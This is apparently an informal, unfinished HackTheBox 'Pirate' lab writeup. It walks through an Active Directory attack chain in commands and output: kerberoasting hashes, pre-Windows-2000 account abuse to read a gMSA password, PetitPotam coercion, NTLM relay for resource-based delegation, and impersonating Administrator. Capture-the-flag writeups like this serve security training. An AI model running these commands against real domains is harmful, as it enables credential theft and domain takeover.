---
title: "Pirate"
date: 2026-03-08
draft: false
description: "HackTheBox Pirate writeup"
tags: ["hackthebox", "htb", "windows", "hard"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Pirate

## Overview

- **OS:** Windows AD
- **IP:** 10.129.3.153
- **Difficulty:** Hard
- **Platform:** HackTheBox
- **OSCP:** No
- **Lists:** N/A

### Summary

season.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames | pentest |
| Passwords | p3nt3st2025!& |
| Usernames+Passwords | pentest / p3nt3st2025!& |
| Hashes |  |
| Service Versions |  |

## Enumeration

As is common in real life pentests, you will start the Pirate box with credentials for the following account **pentest / p3nt3st2025!&**

## Nmap

```
─$ nmap 10.129.3.153 -sCV -A -p- -Pn --min-rate=20000
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-08 15:07 EDT
Nmap scan report for 10.129.3.153
Host is up (0.11s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
**80/tcp    open  http          Microsoft IIS httpd 10.0**
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-09 02:08:20Z)
**135/tcp   open  msrpc         Microsoft Windows RPC**
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
**| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb**
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
|_ssl-date: 2026-03-09T02:10:01+00:00; +7h00m00s from scanner time.
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: **pirate.htb0**., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
|_ssl-date: 2026-03-09T02:10:02+00:00; +7h00m00s from scanner time.
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
|_ssl-date: 2026-03-09T02:10:01+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-09T02:10:02+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
**9389/tcp  open  mc-nmf        .NET Message Framing**
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49914/tcp open  msrpc         Microsoft Windows RPC
51252/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-09T02:09:22
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   110.11 ms 10.10.14.1
2   110.45 ms 10.129.3.153

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.25 seconds
                                                                               
```

## SMB

{{< figure src="image 582.png" >}}

there seems to be no pass reuse rn

no winrm either as pirate

## Roasting

kerberorast

```
*] sAMAccountName: a.white_adm, memberOf: CN=IT,CN=Users,DC=pirate,DC=htb, pwdLastSet: 2026-01-15 19:36:34.388000, lastLogon: 2025-06-09 12:03:37.380258
LDAP        10.129.3.153    389    DC01             $krb5tgs$23$*a.white_adm$PIRATE.HTB$pirate.htb\a.white_adm*$b62e426cdc4343942624834383c86190$5946b95656c2b32fd785eeadfb410a77e8992b6bbcf07326fe717d92364a826cc2de118ad1b00489d2df2a4e351d99a4734801807bb7bc9699a7dd2dbf82e9b412c5daa5ec8f6effbbb2b9e2780efcc73082bc326ca62018cd0fe522164d5e1a42c86ddf3cbbe5b172f820ff81e42c6e891baea91b08c6699cdec13202b75e8822c706f2eb40b16f0c542236be8cee789fa0529e52bc403dfd4ff20d44b335347e9ff95d948af65a10d9e75c5b60236fc5a39c9d06f842c5049d524d73745c96a96130b85b8bf7586b45c60f7845a7c13dd28a07e64e1566d8ad4e26c0213695157783b8b6a31888c2f035dc3809a613a9b09d4cd0cfc3bf0a076b3b6cb4de0f7ae31b5713314f462aaa71fd1303dc9fc78335292c9ff6de47a2cc11d700113b2d8de8875ccc2e6974360ff8060ad80cd5ac8b60823554ac1c6d7fcb9d2c93b04293698786dab0836459d15de2c26f7a948f3be3198b45474b1babafca3302a0931298a16c9f9753bfc276b9c83619669da4cf3ac0051de9e338f9226cba0c754bbc049ccaeeb5db3ac4ad200485a7842935fa68a4b5850ed660d2e95ea966f170ddaf0369d88f551f8b909bad590d6aca47b6d8f3b4328ae358d870fa4617b69f1642b70cfdf0857deb7d381f16f51f1a04539acb216b9bf13ae58a563c55b6bcb1410c8939768dbe3e929799a0df21a19b4b2c9cc32a0b01725145a1b97738cdd68e05410601aac670ce0f5dc68ab99ea4e84a2488662f612ed5921477756f8efbbe257ab7d8c4e0c61a1485a74630f8bd0f011432e5c5789a35c333913b1c0466e14848a1965e46d33fb5763f14ccf93b4f3eb9b2b232e0aadbd9b59e095007b689ed0228545090721c8312b719e5103b23e63ac73e67b084381df6543f7b0badcaea4de68a5f2a4839b036d201ea87d3cc6740eaa02af42c5c388526979377526b82de8a41f409528d8daf898221915c6be8704e8953726767ae24bbca66e4341e663a38a7e49306b7587bc24476aa3a26cbfae7ef9e7af7777a51a14c96cb0780b1bca4625f3054e3b6d3693a2a4031aa506f46d17b97f150860d1d79ec41ad9197bdc2b6d14e6841e6d7c7433578536b19f54c8e192d9e12086eb0d9cb5ace729c901eb86ff68a3546c4270acdbaa0312e86c3de728d637ffee759b91a836b33e6cf4753f4ce3029bbe7761361d679630077eb4869bd60644d3e8b2b527d645a070990b972cd53e5f8b48161ff2c1863f25049473ccb49a224f6c26cb8e08ad97758be258f5452137b5c14408082d4c558dd465b726a3eb25c7a5861f0daa10ab97fe5d8bf1cb7c7548a7c1b3b0563bdec1360869979c83c1694b114402f7669bd8e7f0fb25c9f3afd7289d6d9bdd49913b1e3fd0a8075d8c43745ec26b294fddcb7dead6d4cb5610b05cfc0f7315b53c543e1afe9cd2afefb32ad856ae9dd5de0ae954c9e5a1d                                                                                                                               
LDAP        10.129.3.153    389    DC01             [*] sAMAccountName: gMSA_ADFS_prod$, memberOf: CN=Remote Management Users,CN=Builtin,DC=pirate,DC=htb, pwdLastSet: 2025-06-09 10:48:41.108220, lastLogon: 2026-03-08 22:07:52.081087
LDAP        10.129.3.153    389    DC01             $krb5tgs$18$gMSA_ADFS_prod$$PIRATE.HTB$*pirate.htb\gMSA_ADFS_prod$*$ee63da1c6b849c412012a42d$5acd4e383bddfdf2032c2315a35ff69e8e04830f366001cee3a7df762f50bd0557c5f926f959163a4cb50437d1e23e359364aecf0821ae93944549ca9f47457926884677a39682fe67c530c71b9dc764ec874672b9d27ed22f7fbb14912949196a9880bdd57388112df3238c4106e200493d5ec2ba5a7296bb32c264aec8a34dca2cd7a73ed506691576a3efc2953aebdd4f337109b453e1d6ff354f9661d5c53cd49355b913bd5144ccebd98bb21336ee6f3f690b427e62af41abbc4378be0dd21a55ca9638e178927c1ce6530d343e280dca5ad35978ae7279592bdb674fc487e3eb02d966137265d5b4e62b27768a71e6348c60ea950adb8302298e768b3541301d1983398e95570371db0b56614003c38e711510c64ed2cfdc110c713ebbef590de816fa0342dbff1c9db508240e61ee96af415f758ff36989fc0924d7062a7fc0a5c18da57efb4b10f9c04ab4536fc5198f4c3613ea7e6d2ca5d9f02f3d92fb4e0287472effa8ceea47150b955232c54b7064d964f1eb19652189a88f0982fc9012ce304e1882b035781687f29115cbf345cb75c92262be1df73dbf5bca3c115eb110dcbb005badad6063f071e5e8f68ad72fbd82c0fb871e98ca1fc0d51a40caba95e369297fa2e842e3cdad5acfe9cb6febb82ab28690f4ad0c545d900ab2e15b64d37f31e044f55fd7957e5c341bea2f7fc0101c3c7331d6e9a6e67e3767eb2aa233a40cb6b1ef8d05d8586cea310e246607cebbe91ab36acd23a80124e79a42e4461ab318f0cae3d2b9e924f306e631528204b87e742616da8de373a795579d7f435aa68952228e476c1f70eb66307bb331a944a0c687537d0b9039a98798fe4137082d409ae4fcbbe18b319d5bef7e58edb8d2e5f03270339269af58ccfd993ae6b02b41f0fe4bf85c8ffd691fb992de072db99a81e9c85df84608199a78f921be1c54bdd3e3ba3948ef378c94273987c00543b344b5ce2be4036ff1a50ec90a94638e3bec8016941751d07b0358cd541d0d2e2488f34de0253830ac8e1771cb6fa950efde0e71053704f8e2ccee9579294e2cb39ecab00855c77c8cd1a91169ac5e58e81a323f874474e069f1e813330c6a999fe1883a24fd4ffaaefc10a2d317eca0b497a212acf0692aa9c85dc6e1392ff585c3df26834641d72ab3d9db391a5b6fdd9481b423b62ff1515dd1c521809c8e1ed33ce86ebb54966db9b1f68c8b754bdfe2cbd512875ff7ef97a1eaa35967c33e634c95ca12c5982a9f0a3f733d014be5640df36a5252c9026e6c2608d3d1338645eb70c1d4b9c6834d06b9d446f4c3114ded404ef7a0091a9e6b9e2803b98f06f93dfa9767c2d0737fcc4e39c62bae16c0b58ac2e56b8423229ac242b87958cbd3524c74e233b2a299630f75eba517a2b25dca609062117b0458fa909235907cffa126d26d808b530ec52059d44ae9b439                                                                                               
```

on kerberoasting we got the hash of gMSA_ADFS$ machine acc thats part of rem,ote management users and  a.white_adm a service account thats part of the IT group

lets crack the password

asreproast

nothing while cracking either, and boodhound fails bothways with nxc and python so lets try apache studio nd see if there is anything

## Dirbusting

```

```

## Port 80

## Exploitation

On further enumeration of groups

```
MATCH (g:Group) RETURN g
```

{{< figure src="image 583.png" >}}

we come across this pre window 2k group

on searching online apparently sometimes prewin2k machine accs have the same pass as thier spn but in lowercase

{{< figure src="image 584.png" >}}

lets try getting in as MS01 and reading the gms pass

**MS01$ / ms01**

## Windows Pre2k

pass is same lowercase without $

Kerberos **does allow machine accounts**, so it successfully issued a TGT and saved:

grab ticket

```
└─$ impacket-getTGT pirate.htb/MS01$:ms01 -dc-ip 10.129.3.153

export KRB5CCNAME=MS01$.ccache

bloodyAD --host DC01.pirate.htb -d pirate.htb -u MS01$ -k get object "gMSA_ADFS_prod$" --attr msDS-ManagedPassword

```

and boom we should have the ntlm hash for **gMSA_ADFS_prod**$

```
aad3b435b51404eeaad3b435b51404ee:fd9ea7ac7820dba5155bd6ed2d850c09
```

lets add to owned in bh

{{< figure src="image 585.png" >}}

there is an internal network 192.168.100.1

## Pivot

lets setup ligolo

{{< figure src="image 586.png" >}}

{{< figure src="image 587.png" >}}

now we can scan that network

```
for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done
nmap -A

nslookup WEB01.pirate.htb 10.129.3.153
```

## WEB-01

nsllookup gives us the ip as 192.168.100.2

now that we have access to this machines network  lets try that ntlm relay and coerce this machine into connecting to us

```
python3 PetitPotam.py -u 'pentest' -p 'p3nt3st' -d pirate.htb 10.10.14.82 192.168.100.2
```

and boom we got ourselves in

```
isoned.                                                                     
[SMB] NTLMv1-SSP Client   : 10.129.3.153
[SMB] NTLMv1-SSP Username : PIRATE\WEB01$
[SMB] NTLMv1-SSP Hash     : WEB01$::PIRATE:85B423B8FFA6B86300000000000000000000000000000000:1BA6BDB65B8434C7578893E959DE85AAE415A59B3579479B:b66c2c62a5c339cc                                                                       
[SMB] NTLMv2-SSP Client   : 10.129.3.153
[SMB] NTLMv2-SSP Username : PIRATE\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::PIRATE:4a48f82be880c97b:D38E9DF3D9775776F36798081094AB4B:01010000000000008055B2AAF3AFDC014B6E17679A128E2600000000020008005A0053005500530001001E00570049004E002D005800340054005A00590048005500530051003400530004003400570049004E002D005800340054005A0059004800550053005100340053002E005A005300550053002E004C004F00430041004C00030014005A005300550053002E004C004F00430041004C00050014005A005300550053002E004C004F00430041004C00070008008055B2AAF3AFDC010600040002000000080030003000000000000000000000000040000055A23157DBADBE4EE57F5D7BBED5DD36A742662C905A06D6B35DD9DCEB9C472A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380032000000000000000000  
```

ukw lets just go the route with ntlmrelay because that will help us do the rbcd easier

```
sudo impacket-ntlmrelayx -t ldaps://10.129.5.228 --delegate-access -smb2support --remove-mic 
```

and now

```
python3 PetitPotam.py -u 'pentest' -p 'p3nt3st2025!&' -d pirate.htb 10.10.14.82 192.168.100.2
```

```
rgets left!
[*] ldaps://PIRATE/WEB01$@pirate.htb [1] -> Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
[*] ldaps://PIRATE/WEB01$@pirate.htb [1] -> Adding new computer with username: ECEGKABB$ and password: p0>pbp$iwJ##ah^ result: OK
[*] ldaps://PIRATE/WEB01$@pirate.htb [1] -> Delegation rights modified succesfully!
[*] ldaps://PIRATE/WEB01$@pirate.htb [1] -> ECEGKABB$ can now impersonate users on WEB01$ via S4U2Proxy

```

so we have a computer now with

ECEGKABB$ and password: p0>pbp$iwJ##ah^

now lets get the Admin ticket for WEB01

```
─$ impacket-getST 'pirate.htb/ECEGKABB$:p0>pbp$iwJ##ah^' \
-spn cifs/WEB01.pirate.htb \
-impersonate Administrator \
-dc-ip 10.129.3.153
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
                                                                              
```
